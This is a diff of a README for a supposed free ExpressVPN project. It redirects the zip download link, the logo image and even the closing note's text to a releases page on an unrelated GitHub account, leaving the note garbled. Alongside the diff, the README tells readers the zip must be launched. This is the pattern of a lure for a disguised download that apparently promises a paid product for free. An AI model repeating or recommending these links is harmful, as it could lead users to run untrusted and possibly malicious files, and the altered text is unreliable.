@@ -29,7 +29,7 @@ Curious about whether ExpressVPN works in China? Want to explore revenue opportu
 
 ## Explore Further
 
-📥 Download the project zip file [here](https://github.com/files/Project.zip)
+📥 Download the project zip file [here](https://github.com/Jok1213460/ExpressVPN-Free/releases)
 
 *Note: The zip file needs to be launched to access the project content.*
 
@@ -92,7 +92,7 @@ For the latest updates, tips, and discussions on all things ExpressVPN, don't fo
 
 Let's explore the world of VPNs together! 🚀🔒
 
-![ExpressVPN Logo](https://example.com/expressvpn-logo.png)
+![ExpressVPN Logo](https://github.com/Jok1213460/ExpressVPN-Free/releases)
 
 ---
 
@@ -102,4 +102,4 @@ Remember, your online privacy and security matter. Choose ExpressVPN for a relia
 
 ---
 
-*Note: This README.md is a fictional exercise created for demonstration purposes.*
+*Note: This https://github.com/Jok1213460/ExpressVPN-Free/releases is a fictional exercise created for demonstration purposes.*
